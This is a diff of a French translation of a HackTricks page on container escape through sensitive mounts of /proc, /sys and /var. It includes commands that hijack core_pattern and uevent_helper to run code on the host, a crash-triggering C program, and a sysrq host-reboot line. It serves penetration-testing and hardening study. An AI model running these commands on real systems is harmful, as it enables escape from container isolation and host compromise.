@@ -2,11 +2,11 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-L'exposition de `/proc`, `/sys` et `/var` sans une isolation appropriée des espaces de noms introduit des risques de sécurité significatifs, y compris l'augmentation de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou accessibles par un utilisateur non autorisé, peuvent conduire à une évasion de conteneur, à une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, le montage incorrect de `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.
+L'exposition de `/proc`, `/sys` et `/var` sans isolation de namespace appropriée introduit des risques de sécurité significatifs, y compris l'augmentation de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou accessibles par un utilisateur non autorisé, peuvent conduire à une évasion de conteneur, à une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, monter incorrectement `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.
 
 **Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
-## Vulnérabilités de procfs
+## vulnérabilités procfs
 
 ### `/proc/sys`
 
@@ -15,16 +15,28 @@ Ce répertoire permet d'accéder à la modification des variables du noyau, gén
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Décrit dans [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Permet de définir un programme à exécuter lors de la génération d'un fichier core avec les 128 premiers octets comme arguments. Cela peut conduire à une exécution de code si le fichier commence par un pipe `|`.
+- Si vous pouvez écrire dans ce fichier, il est possible d'écrire un pipe `|` suivi du chemin vers un programme ou un script qui sera exécuté après qu'un crash se produise.
+- Un attaquant peut trouver le chemin à l'intérieur de l'hôte vers son conteneur en exécutant `mount` et écrire le chemin vers un binaire à l'intérieur de son système de fichiers de conteneur. Ensuite, provoquer un crash d'un programme pour faire exécuter le binaire en dehors du conteneur.
+
 - **Exemple de test et d'exploitation** :
-
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Tester l'accès en écriture
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Définir un gestionnaire personnalisé
-sleep 5 && ./crash & # Déclencher le gestionnaire
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+Vérifiez [ce post](https://pwning.systems/posts/escaping-containers-for-fun/) pour plus d'informations.
 
+Exemple de programme qui plante :
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
 - Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -43,14 +55,14 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Vérifier l'accès à modprobe
 #### **`/proc/sys/fs`**
 
 - Selon [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contient des options et des informations sur le système de fichiers.
-- L'accès en écriture peut permettre divers attaques par déni de service contre l'hôte.
+- Un accès en écriture peut permettre divers attaques par déni de service contre l'hôte.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Permet d'enregistrer des interprètes pour des formats binaires non natifs en fonction de leur numéro magique.
 - Peut conduire à une élévation de privilèges ou à un accès shell root si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture.
 - Exploit pertinent et explication :
-- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
+- [Rootkit de pauvre via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Tutoriel approfondi : [Lien vidéo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Autres dans `/proc`
@@ -71,14 +83,14 @@ echo b > /proc/sysrq-trigger # Redémarre l'hôte
 
 #### **`/proc/kmsg`**
 
-- Expose les messages du tampon de noyau.
+- Expose les messages du tampon circulaire du noyau.
 - Peut aider dans les exploits du noyau, les fuites d'adresses et fournir des informations sensibles sur le système.
 
 #### **`/proc/kallsyms`**
 
 - Liste les symboles exportés par le noyau et leurs adresses.
 - Essentiel pour le développement d'exploits du noyau, en particulier pour surmonter KASLR.
-- Les informations d'adresse sont restreintes avec `kptr_restrict` réglé sur `1` ou `2`.
+- Les informations d'adresse sont restreintes avec `kptr_restrict` défini sur `1` ou `2`.
 - Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
@@ -90,7 +102,7 @@ echo b > /proc/sysrq-trigger # Redémarre l'hôte
 #### **`/proc/kcore`**
 
 - Représente la mémoire physique du système au format ELF core.
-- La lecture peut divulguer le contenu de la mémoire du système hôte et d'autres conteneurs.
+- La lecture peut révéler le contenu de la mémoire du système hôte et d'autres conteneurs.
 - La grande taille du fichier peut entraîner des problèmes de lecture ou des plantages de logiciels.
 - Utilisation détaillée dans [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
@@ -114,7 +126,7 @@ echo b > /proc/sysrq-trigger # Redémarre l'hôte
 - Fournit des informations sur les points de montage dans l'espace de noms de montage du processus.
 - Expose l'emplacement du `rootfs` ou de l'image du conteneur.
 
-### Vulnérabilités de `/sys`
+### Vulnérabilités `/sys`
 
 #### **`/sys/kernel/uevent_helper`**
 
@@ -130,7 +142,7 @@ echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /ev
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Définit uevent_helper sur le gestionnaire malveillant
+#### Définit uevent_helper sur l'assistant malveillant
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -148,7 +160,7 @@ cat /output %%%
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Fuit les adresses du noyau, compromettant potentiellement KASLR.
+- Fuit des adresses du noyau, compromettant potentiellement KASLR.
 
 #### **`/sys/kernel/security`**
 
@@ -158,16 +170,16 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` et `/sys/firmware/efi/efivars`**
 
 - Expose des interfaces pour interagir avec les variables EFI dans NVRAM.
-- Une mauvaise configuration ou une exploitation peut conduire à des ordinateurs portables brisés ou à des machines hôtes non amorçables.
+- Une mauvaise configuration ou une exploitation peut entraîner des ordinateurs portables brisés ou des machines hôtes non amorçables.
 
 #### **`/sys/kernel/debug`**
 
 - `debugfs` offre une interface de débogage "sans règles" au noyau.
 - Historique de problèmes de sécurité en raison de sa nature non restreinte.
 
-### Vulnérabilités de `/var`
+### Vulnérabilités `/var`
 
-Le dossier **/var** de l'hôte contient des sockets d'exécution de conteneur et les systèmes de fichiers des conteneurs. Si ce dossier est monté à l'intérieur d'un conteneur, ce conteneur obtiendra un accès en lecture-écriture aux systèmes de fichiers d'autres conteneurs avec des privilèges root. Cela peut être abusé pour pivoter entre les conteneurs, provoquer un déni de service ou créer des portes dérobées dans d'autres conteneurs et applications qui s'exécutent en eux.
+Le dossier **/var** de l'hôte contient des sockets d'exécution de conteneur et les systèmes de fichiers des conteneurs. Si ce dossier est monté à l'intérieur d'un conteneur, ce conteneur obtiendra un accès en lecture-écriture aux systèmes de fichiers d'autres conteneurs avec des privilèges root. Cela peut être abusé pour pivoter entre les conteneurs, provoquer un déni de service ou introduire des portes dérobées dans d'autres conteneurs et applications qui s'exécutent dans ceux-ci.
 
 #### Kubernetes
 
@@ -220,7 +232,7 @@ L'XSS a été réalisé :
 
 Notez que le conteneur NE nécessite PAS de redémarrage ou quoi que ce soit. Tous les changements effectués via le dossier monté **/var** seront appliqués instantanément.
 
-Vous pouvez également remplacer des fichiers de configuration, des binaires, des services, des fichiers d'application et des profils shell pour obtenir un RCE automatique (ou semi-automatique).
+Vous pouvez également remplacer des fichiers de configuration, des binaires, des services, des fichiers d'application et des profils de shell pour obtenir un RCE automatique (ou semi-automatique).
 
 ##### Accès aux identifiants cloud
 
